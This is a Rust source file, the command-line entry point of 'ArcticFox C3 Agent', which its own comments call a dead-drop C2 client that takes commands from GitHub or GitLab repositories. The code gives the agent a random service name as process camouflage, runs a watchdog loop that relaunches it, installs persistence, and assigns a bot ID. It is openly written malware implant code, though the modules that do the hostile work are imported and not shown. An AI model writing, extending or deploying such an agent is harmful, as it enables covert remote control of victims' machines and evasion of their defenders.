//! ArcticFox C3 Agent — main entry point.
//!
//! Command-line interface for the dead-drop C2 agent.

use clap::Parser;
use std::path::PathBuf;
use tokio::sync::watch;
use tracing::{error, info};
use tracing_subscriber::EnvFilter;

use arcticfox_agent::{Agent, install_persistence};

/// ArcticFox C3 Agent — Async Dead-Drop C2 Client
#[derive(Parser)]
#[command(name = "arcticfox-agent", version, about)]
struct Cli {
    /// Repos to monitor (format: [gh:|gl:|dp:]owner/repo[:branch])
    #[arg(short = 'r', long = "repo", value_name = "REPO_SPEC")]
    repos: Vec<String>,

    /// Path to config file
    #[arg(short = 'c', long = "config", default_value = "pb_config.json")]
    config: PathBuf,

    /// Run in daemon mode (background)
    #[arg(long)]
    daemon: bool,

    /// Install persistence and exit
    #[arg(long)]
    install: bool,

    /// Path to agent binary (for persistence install)
    #[arg(long)]
    agent_path: Option<PathBuf>,

    /// Enable verbose logging
    #[arg(short = 'v', long = "verbose")]
    verbose: bool,

    /// Bot ID override
    #[arg(long)]
    bot_id: Option<String>,

    /// Stealth: camouflage process name
    #[arg(long = "stealth-name")]
    stealth_name: Option<String>,

    /// Watchdog mode — monitors a parent PID
    #[arg(long)]
    watchdog: bool,

    /// Parent PID for watchdog
    #[arg(long = "parent-pid")]
    parent_pid: Option<u32>,
}

#[tokio::main]
async fn main() {
    let cli = Cli::parse();

    // Initialize tracing
    let env_filter = if cli.verbose {
        EnvFilter::new("debug")
    } else if cli.daemon {
        EnvFilter::new("info")
    } else {
        EnvFilter::new("arcticfox_agent=info,arcticfox_core=warn")
    };

    tracing_subscriber::fmt()
        .with_env_filter(env_filter)
        .with_target(false)
        .init();

    // ── Stealth: camouflage process name early ────────────────────────
    let stealth_name = cli.stealth_name
        .or_else(|| Some(arcticfox_agent::stealth::random_service_name().to_string()))
        .unwrap();
    arcticfox_agent::stealth::camouflage_process_name(&stealth_name);
    arcticfox_agent::stealth::set_process_title(&stealth_name);

    // ── Watchdog mode ─────────────────────────────────────────────────
    if cli.watchdog {
        if let Some(ppid) = cli.parent_pid {
            let agent_path = cli.agent_path.unwrap_or_else(|| {
                std::env::current_exe().unwrap_or_else(|_| PathBuf::from("arcticfox-agent"))
            });
            arcticfox_agent::stealth::watchdog_loop(ppid, agent_path, cli.config).await;
            return;
        }
        error!("Watchdog mode requires --parent-pid");
        std::process::exit(1);
    }

    // Install persistence and exit
    if cli.install {
        let agent_path = cli.agent_path.unwrap_or_else(|| {
            std::env::current_exe().unwrap_or_else(|_| PathBuf::from("arcticfox-agent"))
        });
        if let Err(e) = install_persistence(&agent_path, &cli.config) {
            error!("Failed to install persistence: {e}");
            std::process::exit(1);
        }
        info!("Persistence installed successfully");
        return;
    }

    // Load config
    let mut config = match arcticfox_core::config::AgentConfig::load(&cli.config) {
        Ok(cfg) => cfg,
        Err(e) => {
            error!("Failed to load config: {e}");
            std::process::exit(1);
        }
    };

    // Add repos from command line
    for spec in &cli.repos {
        match arcticfox_core::repo::parse_repo_spec(spec) {
            Ok(rt) => {
                config.repos.push(arcticfox_core::config::RepoSource {
                    owner: rt.owner,
                    repo: rt.repo,
                    platform: rt.platform,
                    branch: rt.branch,
                    file_path: rt.file_path,
                    active: true,
                    fail_count: 0,
                    last_success: 0.0,
                    last_fail: 0.0,
                });
            }
            Err(e) => {
                error!("Invalid repo spec '{}': {}", spec, e);
            }
        }
    }

    // Validate config
    if config.repos.is_empty() {
        error!("No repos configured. Use -r to add repos or provide a config file.");
        std::process::exit(1);
    }

    info!("Loaded {} repos", config.repos.len());

    // Set up shutdown signal
    let (shutdown_tx, shutdown_rx) = watch::channel(false);
    
    // Handle Ctrl+C
    let shutdown_tx_clone = shutdown_tx.clone();
    tokio::spawn(async move {
        tokio::signal::ctrl_c().await.ok();
        info!("Received shutdown signal");
        shutdown_tx_clone.send(true).ok();
    });

    // Create and run agent
    let agent = match Agent::new(config, cli.bot_id, cli.config).await {
        Ok(a) => a,
        Err(e) => {
            error!("Failed to initialize agent: {e}");
            std::process::exit(1);
        }
    };

    if let Err(e) = agent.run(shutdown_rx).await {
        error!("Agent error: {e}");
        std::process::exit(1);
    }

    info!("Agent exited cleanly");
}
